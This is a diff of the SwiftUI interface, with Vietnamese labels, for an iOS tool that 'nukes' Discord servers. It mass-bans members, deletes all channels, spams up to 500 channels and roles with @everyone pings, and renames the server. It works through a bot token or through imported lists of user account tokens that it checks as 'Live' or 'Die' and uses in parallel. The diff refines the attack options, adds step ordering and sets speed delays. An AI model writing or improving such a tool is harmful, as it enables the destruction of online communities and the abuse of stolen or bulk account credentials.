+                        Text(c.displayName).font(.subheadline.bold())
+                        Text("Bot ID: \(c.userId)").font(.caption2).foregroundStyle(.secondary)
                     }
                     Spacer()
                     Menu {
-                        Button("Đổi token") { bot.removeConfig() }
-                        Button("Refresh") { Task { await bot.loadGuilds() } }
-                    } label: { Text("Menu").font(.caption.bold()) }
+                        Button("Đổi token", systemImage: "key") { bot.removeConfig() }
+                        Button("Refresh", systemImage: "arrow.clockwise") { Task { await bot.loadGuilds() } }
+                    } label: { Image(systemName: "ellipsis.circle").font(.title3) }
                 }.padding().background(Color(UIColor.secondarySystemBackground))
             }
-
-            if bot.isLoadingGuilds {
-                ProgressView("Đang tải...").padding(.top, 40); Spacer()
-            } else if bot.botGuilds.isEmpty {
-                EmptyStateView(title: "Chưa có server", description: "Mời bot vào server rồi Refresh.")
+            if bot.isLoadingGuilds { ProgressView("Đang tải...").padding(.top, 40); Spacer() }
+            else if bot.botGuilds.isEmpty {
+                EmptyStateView(title: "Bot chưa vào server nào", systemImage: "server.rack", description: "Mời bot rồi Refresh.")
             } else {
                 List(filtered) { g in
                     Button { selectedGuild = g } label: {
                         HStack(spacing: 12) {
-                            if let icon = g.icon,
-                               let url = URL(string: "https://cdn.discordapp.com/icons/\(g.id)/\(icon).png?size=64") {
+                            if let icon = g.icon, let url = URL(string: "https://cdn.discordapp.com/icons/\(g.id)/\(icon).png?size=64") {
                                 AsyncImage(url: url) { img in img.resizable().scaledToFill() }
-                                placeholder: { Circle().fill(.gray.opacity(0.3)) }
-                                    .frame(width: 42, height: 42).clipShape(Circle())
-                            } else {
-                                Circle().fill(Color.secondary.opacity(0.2))
-                                    .overlay(Text(String(g.name.prefix(1)).uppercased())
-                                                .font(.subheadline.bold()).foregroundStyle(.secondary))
-                                    .frame(width: 42, height: 42)
-                            }
+                                placeholder: { Circle().fill(.gray.opacity(0.3)) }.frame(width: 42, height: 42).clipShape(Circle())
+                            } else { Circle().fill(.gray.opacity(0.3)).frame(width: 42, height: 42) }
                             VStack(alignment: .leading, spacing: 2) {
                                 Text(g.name).font(.headline)
                                 Text(g.id).font(.caption2).foregroundStyle(.secondary).monospaced()
                             }
                             Spacer()
-                            Text("›").foregroundStyle(.tertiary).font(.title3)
+                            Image(systemName: "chevron.right").foregroundStyle(.tertiary)
                         }.padding(.vertical, 4)
                     }.buttonStyle(.plain)
                 }.searchable(text: $searchText, prompt: "Tìm...")
@@ -1793,142 +1680,183 @@ struct BotGuildListView: View {
     }
 }
 
+// ==========================================
+// MARK: - NUKE OPTIONS (shared)
+// ==========================================
+enum NukeMode { case bot, user }
+
 struct NukeOptionsView: View {
     @EnvironmentObject var bot: BotManager
     @EnvironmentObject var userNuke: UserNukeManager
     let guild: Guild
     @Binding var selectedGuild: Guild?
     let mode: NukeMode
-    enum NukeMode { case bot, user }
-
     @State private var options = NukeConfig()
 
-    var canRun: Bool {
-        options.doMassBan || options.doDeleteChannels || options.doCreateRoles ||
-        options.doCreateChannels || options.doRenameGuild
-    }
+    var canRun: Bool { !options.enabledSteps.isEmpty }
 
     var body: some View {
         ScrollView {
             VStack(spacing: 14) {
                 HStack {
-                    Text("CẢNH BÁO").font(.caption.bold()).foregroundStyle(.orange)
+                    Image(systemName: "exclamationmark.triangle.fill").foregroundStyle(.orange)
+                    Text("KHÔNG THỂ HOÀN TÁC").font(.caption.bold())
                     Spacer()
                 }.padding(12).background(Color.orange.opacity(0.15)).cornerRadius(10)
 
                 HStack(spacing: 12) {
-                    if let icon = guild.icon,
-                       let url = URL(string: "https://cdn.discordapp.com/icons/\(guild.id)/\(icon).png?size=64") {
+                    if let icon = guild.icon, let url = URL(string: "https://cdn.discordapp.com/icons/\(guild.id)/\(icon).png?size=64") {
                         AsyncImage(url: url) { img in img.resizable().scaledToFill() }
-                        placeholder: { Circle().fill(.gray.opacity(0.3)) }
-                            .frame(width: 48, height: 48).clipShape(Circle())
-                    } else {
-                        Circle().fill(Color.secondary.opacity(0.2))
-                            .overlay(Text(String(guild.name.prefix(1)).uppercased())
-                                        .font(.title3.bold()).foregroundStyle(.secondary))
-                            .frame(width: 48, height: 48)
-                    }
+                        placeholder: { Circle().fill(.gray.opacity(0.3)) }.frame(width: 48, height: 48).clipShape(Circle())
+                    } else { Circle().fill(.gray.opacity(0.3)).frame(width: 48, height: 48) }
                     VStack(alignment: .leading, spacing: 2) {
                         Text(guild.name).font(.headline)
                         Text(guild.id).font(.caption2.monospaced()).foregroundStyle(.secondary)
                     }
                     Spacer()
                     Button { selectedGuild = nil } label: {
-                        Text("X").font(.caption.bold()).foregroundStyle(.secondary)
-                            .padding(8).background(Color.secondary.opacity(0.15)).clipShape(Circle())
+                        Image(systemName: "xmark.circle.fill").foregroundStyle(.secondary).font(.title3)
                     }
                 }.padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(12)
 
-                toggleSection("Mass Ban", $options.doMassBan) {
-                    VStack(alignment: .leading, spacing: 8) {
-                        Text(mode == .user
-                             ? "Quét member qua WebSocket và ban song song bằng tất cả token."
-                             : "Ban mọi member có role thấp hơn bot.")
-                            .font(.caption2).foregroundStyle(.secondary)
-                        if mode == .user {
-                            TextField("Role ID để ban (trống = ban tất cả)", text: $options.banRoleId)
-                                .keyboardType(.numberPad).textFieldStyle(.roundedBorder)
-                        }
+                VStack(alignment: .leading, spacing: 8) {
+                    Text("THỨ TỰ & CHỨC NĂNG").font(.caption).bold().foregroundStyle(.secondary)
+                    ForEach(Array(options.stepOrder.enumerated()), id: \.element) { idx, step in
+                        stepCard(step: step, index: idx, total: options.stepOrder.count)
                     }
-                }
-
-                toggleSection("Xóa kênh", $options.doDeleteChannels) {
-                    Text("Xóa toàn bộ kênh.").font(.caption2).foregroundStyle(.secondary)
-                }
-
-                toggleSection("Tạo kênh + Spam", $options.doCreateChannels) {
-                    VStack(spacing: 10) {
-                        TextField("Tên kênh", text: $options.channelName).textFieldStyle(.roundedBorder)
-                        HStack {
-                            Text("Số kênh:").font(.subheadline); Spacer()
-                            Stepper("\(options.channelCount)", value: $options.channelCount, in: 1...500)
-                        }
-                        TextField("Nội dung tin nhắn", text: $options.messageContent, axis: .vertical)
-                            .textFieldStyle(.roundedBorder).lineLimit(2...5)
-                        Toggle("Tag @everyone", isOn: $options.tagEveryone).tint(.green)
-                    }
-                }
-
-                toggleSection("Tạo Role", $options.doCreateRoles) {
-                    VStack(spacing: 10) {
-                        TextField("Tên role", text: $options.roleName).textFieldStyle(.roundedBorder)
-                        HStack {
-                            Text("Số role:").font(.subheadline); Spacer()
-                            Stepper("\(options.roleCount)", value: $options.roleCount, in: 1...500)
-                        }
-                    }
-                }
-
-                toggleSection("Đổi tên Server", $options.doRenameGuild) {
-                    TextField("Tên server mới", text: $options.newGuildName).textFieldStyle(.roundedBorder)
                 }
 
                 Button {
-                    if mode == .bot { Task { await bot.runNuke(guild: guild, options: options) } }
-                    else { Task { await userNuke.runNuke(guild: guild, options: options) } }
+                    if mode == .bot {
+                        Task { await bot.runNuke(guild: guild, options: options) }
+                    } else {
+                        Task { await userNuke.runNuke(guild: guild, options: options) }
+                    }
                 } label: {
-                    Text("BẮT ĐẦU NUKE").bold().frame(maxWidth: .infinity).padding()
-                }
-                .background(canRun ? Color.red : Color.gray)
-                .foregroundStyle(.white).cornerRadius(12)
+                    Text("BẮT ĐẦU NUKE (\(options.enabledSteps.count) bước)").bold()
+                        .frame(maxWidth: .infinity).padding()
+                }.background(canRun ? Color.red : Color.gray).foregroundStyle(.white).cornerRadius(12)
                 .disabled(!canRun).padding(.top, 8)
 
-                if !canRun {
-                    Text("Chọn ít nhất 1 chức năng").font(.caption).foregroundStyle(.secondary)
-                }
+                if !canRun { Text("Chọn ít nhất 1 bước").font(.caption).foregroundStyle(.secondary) }
             }.padding()
         }
         .background(Color(UIColor.systemGroupedBackground))
     }
 
     @ViewBuilder
-    func toggleSection<Content: View>(_ title: String,
-                                       _ isOn: Binding<Bool>,
-                                       @ViewBuilder content: () -> Content) -> some View {
+    func stepCard(step: NukeStepType, index: Int, total: Int) -> some View {
+        let isOn = options.enabledSteps.contains(step)
         VStack(spacing: 0) {
-            HStack {
-                Text(title).font(.headline)
+            HStack(spacing: 10) {
+                VStack(spacing: 0) {
+                    Button { if index > 0 { options.stepOrder.swapAt(index, index - 1) } } label: {
+                        Image(systemName: "chevron.up").font(.caption.bold())
+                    }.disabled(index == 0).buttonStyle(.plain)
+                    Button { if index < total - 1 { options.stepOrder.swapAt(index, index + 1) } } label: {
+                        Image(systemName: "chevron.down").font(.caption.bold())
+                    }.disabled(index == total - 1).buttonStyle(.plain)
+                }.foregroundStyle(.secondary)
+
+                Text("\(index + 1)").font(.caption.bold()).foregroundStyle(.secondary).frame(width: 18)
+                Image(systemName: step.icon).foregroundStyle(.indigo).frame(width: 20)
+                Text(step.rawValue).font(.headline)
                 Spacer()
-                Toggle("", isOn: isOn).labelsHidden().tint(.indigo)
+                Toggle("", isOn: Binding(
+                    get: { isOn },
+                    set: { v in
+                        if v { options.enabledSteps.insert(step) } else { options.enabledSteps.remove(step) }
+                    }
+                )).labelsHidden().tint(.indigo)
             }.padding()
-            if isOn.wrappedValue {
+
+            if isOn {
                 Divider()
-                content().padding().frame(maxWidth: .infinity, alignment: .leading)
+                stepConfig(step: step).padding()
+            }
+        }.background(Color(UIColor.secondarySystemBackground)).cornerRadius(12)
+    }
+
+    @ViewBuilder
+    func stepConfig(step: NukeStepType) -> some View {
+        switch step {
+        case .massBan:
+            VStack(alignment: .leading, spacing: 10) {
+                Text(mode == .user
+                     ? "Ban member qua WebSocket, chia đều cho tất cả token."
+                     : "Ban member có role thấp hơn bot.")
+                    .font(.caption2).foregroundStyle(.secondary)
+                if mode == .user {
+                    TextField("Role ID để ban (trống = tất cả)", text: $options.banRoleId)
+                        .keyboardType(.numberPad).textFieldStyle(.roundedBorder)
+                }
+                speedSlider("Tốc độ ban (mỗi member)", value: $options.banDelay)
+            }
+        case .deleteChannels:
+            VStack(alignment: .leading, spacing: 10) {
+                Text("Xóa toàn bộ kênh hiện có.").font(.caption2).foregroundStyle(.secondary)
+                speedSlider("Tốc độ xóa (mỗi kênh)", value: $options.deleteDelay)
+            }
+        case .renameGuild:
+            TextField("Tên server mới", text: $options.newGuildName).textFieldStyle(.roundedBorder)
+        case .createRoles:
+            VStack(alignment: .leading, spacing: 10) {
+                TextField("Tên role", text: $options.roleName).textFieldStyle(.roundedBorder)
+                countInput("Số role", value: $options.roleCount)
+                speedSlider("Tốc độ tạo role", value: $options.createRoleDelay)
+            }
+        case .createChannels:
+            VStack(alignment: .leading, spacing: 10) {
+                TextField("Tên kênh", text: $options.channelName).textFieldStyle(.roundedBorder)
+                countInput("Số kênh", value: $options.channelCount)
+                TextField("Nội dung tin nhắn", text: $options.messageContent, axis: .vertical)
+                    .textFieldStyle(.roundedBorder).lineLimit(2...5)
+                Toggle("Tag @everyone", isOn: $options.tagEveryone).tint(.green)
+                speedSlider("Tốc độ tạo kênh", value: $options.createChDelay)
+                speedSlider("Tốc độ gửi tin", value: $options.msgDelay)
             }
         }
-        .background(Color(UIColor.secondarySystemBackground)).cornerRadius(12)
+    }
+
+    @ViewBuilder
+    func speedSlider(_ label: String, value: Binding<Double>) -> some View {
+        VStack(alignment: .leading, spacing: 4) {
+            HStack {
+                Text(label).font(.caption)
+                Spacer()
+                Text(String(format: "%.2fs", value.wrappedValue))
+                    .font(.caption.bold()).monospacedDigit().foregroundStyle(.indigo)
+            }
+            Slider(value: value, in: 0...1, step: 0.01).tint(.indigo)
+        }
+    }
+
+    @ViewBuilder
+    func countInput(_ label: String, value: Binding<Int>) -> some View {
+        HStack {
+            Text(label).font(.subheadline)
+            Spacer()
+            TextField("", value: value, format: .number)
+                .keyboardType(.numberPad)
+                .multilineTextAlignment(.trailing)
+                .frame(width: 70)
+                .textFieldStyle(.roundedBorder)
+                .onChange(of: value.wrappedValue) { v in
+                    if v < 1 { value.wrappedValue = 1 }
+                    if v > 500 { value.wrappedValue = 500 }
+                }
+            Text("/ 500").font(.caption).foregroundStyle(.secondary)
+        }
     }
 }
 
+// ==========================================
+// MARK: - NUKE RUNNING UI (shared) - no icons in log
+// ==========================================
 struct NukeRunningUI: View {
     let phase: String
     let progress: Double
-    let banOk: Int
-    let banFail: Int
-    let chDel: Int
-    let chCreate: Int
-    let msgSent: Int
-    let roleCreate: Int
+    let banOk, banFail, chDel, chCreate, msgSent, roleCreate: Int
     let log: [String]
     let onStop: () -> Void
 
@@ -1948,8 +1876,7 @@ struct NukeRunningUI: View {
                     Text("\(Int(progress * 100))%").font(.caption.bold()).foregroundStyle(.red)
                 }
                 ProgressView(value: progress).tint(.red)
-            }
-            .padding().background(Color.red.opacity(0.08))
+            }.padding().background(Color.red.opacity(0.08))
 
             HStack(spacing: 8) {
                 statCard("Ban", "\(banOk)/\(banOk+banFail)", .red)
@@ -1962,8 +1889,10 @@ struct NukeRunningUI: View {
                 ScrollView {
                     LazyVStack(alignment: .leading, spacing: 2) {
                         ForEach(Array(log.enumerated()), id: \.offset) { i, line in
-                            Text(line).font(.system(size: 11, design: .monospaced))
-                                .frame(maxWidth: .infinity, alignment: .leading).id(i)
+                            Text(line)
+                                .font(.system(size: 11, design: .monospaced))
+                                .frame(maxWidth: .infinity, alignment: .leading)
+                                .id(i)
                         }
                     }.padding(12)
                 }
@@ -1983,6 +1912,7 @@ struct NukeRunningUI: View {
         .background(Color(UIColor.systemGroupedBackground))
         .navigationBarBackButtonHidden(true)
     }
+
     func statCard(_ title: String, _ value: String, _ color: Color) -> some View {
         VStack(spacing: 2) {
             Text(value).font(.title3.bold()).foregroundStyle(color)
@@ -1995,11 +1925,13 @@ struct NukeRunningUI: View {
 struct BotNukeRunningView: View {
     @EnvironmentObject var bot: BotManager
     var body: some View {
-        NukeRunningUI(phase: bot.currentPhase, progress: bot.phaseProgress,
-                      banOk: bot.banSuccess, banFail: bot.banFailed,
-                      chDel: bot.channelsDeleted, chCreate: bot.channelsCreated,
-                      msgSent: bot.messagesSent, roleCreate: bot.rolesCreated,
-                      log: bot.nukeLog, onStop: { bot.stopNuke() })
+        NukeRunningUI(
+            phase: bot.currentPhase, progress: bot.phaseProgress,
+            banOk: bot.banSuccess, banFail: bot.banFailed,
+            chDel: bot.channelsDeleted, chCreate: bot.channelsCreated,
+            msgSent: bot.messagesSent, roleCreate: bot.rolesCreated,
+            log: bot.nukeLog, onStop: { bot.stopNuke() }
+        )
     }
 }
 
@@ -2009,7 +1941,6 @@ struct BotNukeRunningView: View {
 struct UserNukeView: View {
     @EnvironmentObject var userNuke: UserNukeManager
     @State private var selectedGuild: Guild?
-
     var body: some View {
         NavigationStack {
             Group {
@@ -2033,91 +1964,81 @@ struct UserNukeTokenPickerView: View {
     @EnvironmentObject var userNuke: UserNukeManager
     @Binding var selectedGuild: Guild?
     @State private var showImport = false
-
+    @State private var showErr = false
     var body: some View {
         VStack(spacing: 0) {
             HStack(spacing: 10) {
-                Button(action: { showImport = true }) {
-                    Text("Import tokens").font(.subheadline.bold())
-                        .frame(maxWidth: .infinity).padding(12)
+                Button { showImport = true } label: {
+                    Label("Import tokens", systemImage: "doc.badge.plus")
+                        .font(.subheadline.bold()).frame(maxWidth: .infinity).padding(12)
                 }.background(Color.indigo).foregroundStyle(.white).cornerRadius(10)
-
                 if !userNuke.tokens.isEmpty {
                     Menu {
-                        Button("Xóa tất cả", role: .destructive) { userNuke.clearAll() }
+                        Button("Xóa tất cả", systemImage: "trash", role: .destructive) { userNuke.clearAll() }
                     } label: {
-                        Text("Menu").font(.caption.bold()).padding(12)
+                        Image(systemName: "ellipsis.circle").font(.title3).padding(12)
                             .background(Color(UIColor.secondarySystemBackground)).cornerRadius(10)
                     }
                 }
             }.padding(.horizontal).padding(.top, 8)
 
-            if userNuke.isImporting {
-                ProgressView("Đang kiểm tra...").padding(30)
-            }
+            if userNuke.isImporting { ProgressView("Đang kiểm tra...").padding(30) }
 
             if userNuke.tokens.isEmpty {
-                EmptyStateView(title: "Chưa có token user",
-                               description: "Import file .txt (mỗi dòng 1 token) để bắt đầu.")
+                EmptyStateView(title: "Chưa có token user", systemImage: "person.badge.key",
+                               description: "Import file .txt (mỗi dòng 1 token) để bắt đầu.\nToken nuke lưu riêng, KHÔNG chung với token spam.")
             } else {
                 List {
                     Section(header: Text("Chọn token (\(userNuke.selectedTokenIds.count) đã chọn)")) {
-                        ForEach(userNuke.tokens) { token in
+                        ForEach(userNuke.tokens) { t in
                             HStack(spacing: 12) {
-                                Button {
-                                    userNuke.toggleSelection(token)
-                                } label: {
-                                    ZStack {
-                                        Circle()
-                                            .strokeBorder(userNuke.selectedTokenIds.contains(token.id)
-                                                          ? Color.indigo : Color.secondary.opacity(0.4),
-                                                          lineWidth: 1.5)
-                                            .frame(width: 22, height: 22)
-                                        if userNuke.selectedTokenIds.contains(token.id) {
-                                            Circle().fill(Color.indigo).frame(width: 12, height: 12)
-                                        }
-                                    }
+                                Button { userNuke.toggleSelection(t) } label: {
+                                    Image(systemName: userNuke.selectedTokenIds.contains(t.id) ? "checkmark.circle.fill" : "circle")
+                                        .foregroundStyle(userNuke.selectedTokenIds.contains(t.id) ? .indigo : .secondary)
+                                        .font(.title3)
+                                }.buttonStyle(.plain).disabled(!t.isValid)
+
+                                if let url = t.avatarURL {
+                                    AsyncImage(url: url) { img in img.resizable().scaledToFill() }
+                                    placeholder: { Circle().fill(Color.gray.opacity(0.3)) }.frame(width: 36, height: 36).clipShape(Circle())
+                                } else {
+                                    Image(systemName: "person.circle.fill").resizable()
+                                        .frame(width: 36, height: 36).foregroundStyle(.gray)
                                 }
-                                .buttonStyle(.plain)
-                                .disabled(!token.isValid)
-
-                                AvatarView(url: token.avatarURL, initial: token.initial, size: 36)
-
                                 VStack(alignment: .leading, spacing: 2) {
-                                    Text(token.username).font(.subheadline.bold())
-                                    Text(token.isValid ? "Live" : "Die").font(.caption2).bold()
-                                        .foregroundStyle(token.isValid ? .green : .red)
+                                    Text(t.username).font(.subheadline.bold())
+                                    Text(t.isValid ? "Live" : "Die").font(.caption2).bold()
+                                        .foregroundStyle(t.isValid ? .green : .red)
                                 }
                                 Spacer()
-                                Button { userNuke.removeToken(token.id) } label: {
-                                    Text("X").font(.caption.bold()).foregroundStyle(.secondary)
-                                        .padding(8).background(Color.secondary.opacity(0.15)).clipShape(Circle())
+                                Button { userNuke.removeToken(t.id) } label: {
+                                    Image(systemName: "xmark.circle.fill").foregroundStyle(.secondary).font(.title3)
                                 }.buttonStyle(.plain)
-                            }.opacity(token.isValid ? 1 : 0.5)
+                            }.opacity(t.isValid ? 1 : 0.5)
                         }
                     }
                 }
             }
 
             if !userNuke.selectedTokenIds.isEmpty {
-                Button(action: {
+                Button {
                     Task { await userNuke.loadAllGuildsForSelected() }
-                }) {
+                } label: {
                     HStack {
                         if userNuke.isLoadingGuilds { ProgressView().tint(.white) }
                         Text("TIẾP TỤC (\(userNuke.selectedTokenIds.count) token)").bold()
                     }.frame(maxWidth: .infinity).padding()
-                }
-                .background(Color.indigo).foregroundStyle(.white).cornerRadius(12)
+                }.background(Color.indigo).foregroundStyle(.white).cornerRadius(12)
                 .padding(.horizontal).padding(.bottom, 8)
                 .disabled(userNuke.isLoadingGuilds)
             }
         }
         .sheet(isPresented: $showImport) {
-            DocumentPicker(contentTypes: [.item]) { url in
-                Task { await userNuke.importFromFile(url: url) }
-            }
+            DocumentPicker(contentTypes: [.item]) { u in Task { await userNuke.importFromFile(url: u) } }
         }
+        .alert("Lỗi", isPresented: $showErr) { Button("OK", role: .cancel) {} }
+        message: { Text(userNuke.importError ?? "") }
+        .onChange(of: userNuke.importError) { v in if v != nil { showErr = true } }
     }
 }
 
@@ -2125,49 +2046,43 @@ struct UserNukeGuildListView: View {
     @EnvironmentObject var userNuke: UserNukeManager
     @Binding var selectedGuild: Guild?
     @State private var searchText = ""
-
     var filtered: [Guild] {
         searchText.isEmpty ? userNuke.eligibleGuilds : userNuke.eligibleGuilds.filter { $0.name.localizedCaseInsensitiveContains(searchText) }
     }
-
     var body: some View {
         VStack(spacing: 0) {
             HStack(spacing: 8) {
+                Image(systemName: "shield.checkerboard").foregroundStyle(.green)
                 Text("Server mà TẤT CẢ \(userNuke.selectedTokenIds.count) token đều có quyền")
                     .font(.caption).foregroundStyle(.secondary)
                 Spacer()
-                Button { Task { await userNuke.loadAllGuildsForSelected() } } label: {
-                    Text("Refresh").font(.caption.bold()).padding(8)
+                Button { userNuke.clearSelection() } label: {
+                    Text("Đổi").font(.caption.bold()).padding(6)
+                        .background(Color.indigo.opacity(0.15)).cornerRadius(6)
                 }
-            }.padding(.horizontal).padding(.vertical, 8)
-            .background(Color.green.opacity(0.1))
+                Button { Task { await userNuke.loadAllGuildsForSelected() } } label: {
+                    Image(systemName: "arrow.clockwise").padding(8)
+                }
+            }.padding(.horizontal).padding(.vertical, 8).background(Color.green.opacity(0.1))
 
-            if userNuke.isLoadingGuilds {
-                ProgressView("Đang tải...").padding(40); Spacer()
-            } else if userNuke.eligibleGuilds.isEmpty {
-                EmptyStateView(title: "Không có server chung",
-                               description: "Tất cả token phải cùng ở server và đủ quyền (Admin hoặc Manage Server + Manage Channels + Ban).")
+            if userNuke.isLoadingGuilds { ProgressView("Đang tải...").padding(40); Spacer() }
+            else if userNuke.eligibleGuilds.isEmpty {
+                EmptyStateView(title: "Không có server chung", systemImage: "exclamationmark.triangle",
+                               description: "Tất cả token phải cùng ở server và đủ quyền (Admin / Manage Server / Manage Channels / Ban).")
             } else {
                 List(filtered) { g in
                     Button { selectedGuild = g } label: {
                         HStack(spacing: 12) {
-                            if let icon = g.icon,
-                               let url = URL(string: "https://cdn.discordapp.com/icons/\(g.id)/\(icon).png?size=64") {
+                            if let icon = g.icon, let url = URL(string: "https://cdn.discordapp.com/icons/\(g.id)/\(icon).png?size=64") {
                                 AsyncImage(url: url) { img in img.resizable().scaledToFill() }
-                                placeholder: { Circle().fill(.gray.opacity(0.3)) }
-                                    .frame(width: 42, height: 42).clipShape(Circle())
-                            } else {
-                                Circle().fill(Color.secondary.opacity(0.2))
-                                    .overlay(Text(String(g.name.prefix(1)).uppercased())
-                                                .font(.subheadline.bold()).foregroundStyle(.secondary))
-                                    .frame(width: 42, height: 42)
-                            }
+                                placeholder: { Circle().fill(.gray.opacity(0.3)) }.frame(width: 42, height: 42).clipShape(Circle())
+                            } else { Circle().fill(.gray.opacity(0.3)).frame(width: 42, height: 42) }
                             VStack(alignment: .leading, spacing: 2) {
                                 Text(g.name).font(.headline)
                                 Text(g.id).font(.caption2).foregroundStyle(.secondary).monospaced()
                             }
                             Spacer()
-                            Text("›").foregroundStyle(.tertiary).font(.title3)
+                            Image(systemName: "chevron.right").foregroundStyle(.tertiary)
                         }.padding(.vertical, 4)
                     }.buttonStyle(.plain)
                 }.searchable(text: $searchText, prompt: "Tìm...")
@@ -2179,10 +2094,12 @@ struct UserNukeGuildListView: View {
 struct UserNukeRunningView: View {
     @EnvironmentObject var userNuke: UserNukeManager
     var body: some View {
-        NukeRunningUI(phase: userNuke.currentPhase, progress: userNuke.phaseProgress,
-                      banOk: userNuke.banSuccess, banFail: userNuke.banFailed,
-                      chDel: userNuke.channelsDeleted, chCreate: userNuke.channelsCreated,
-                      msgSent: userNuke.messagesSent, roleCreate: userNuke.rolesCreated,
-                      log: userNuke.nukeLog, onStop: { userNuke.stop() })
+        NukeRunningUI(
+            phase: userNuke.currentPhase, progress: userNuke.phaseProgress,
+            banOk: userNuke.banSuccess, banFail: userNuke.banFailed,
+            chDel: userNuke.channelsDeleted, chCreate: userNuke.channelsCreated,
+            msgSent: userNuke.messagesSent, roleCreate: userNuke.rolesCreated,
+            log: userNuke.nukeLog, onStop: { userNuke.stop() }
+        )
     }
 }
